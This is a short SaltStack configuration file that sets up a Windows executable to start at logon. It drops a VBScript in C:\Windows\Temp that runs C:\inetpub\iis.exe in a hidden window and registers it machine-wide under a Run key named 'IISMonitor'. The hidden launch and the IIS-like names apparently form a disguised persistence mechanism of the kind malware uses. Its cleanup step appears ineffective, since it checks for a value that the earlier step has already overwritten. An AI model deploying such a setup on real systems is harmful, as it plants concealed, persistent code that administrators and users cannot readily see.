deploy_vbs_launcher:
  file.managed:
    - name: C:\Windows\Temp\iis_launch.vbs
    - contents: |
        CreateObject("WScript.Shell").Run "C:\inetpub\iis.exe", 0, False
    - makedirs: True
    - replace: True

iis_autorun_all_users:
  reg.present:
    - name: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    - vname: IISMonitor
    - vdata: wscript.exe //B C:\Windows\Temp\iis_launch.vbs
    - vtype: REG_SZ
    - require:
      - file: deploy_vbs_launcher

cleanup_old_iis_runkey:
  cmd.run:
    - name: reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v IISMonitor /f
    - onlyif: reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v IISMonitor | findstr /C:"C:\inetpub\iis.exe"
    - require:
      - reg: iis_autorun_all_users
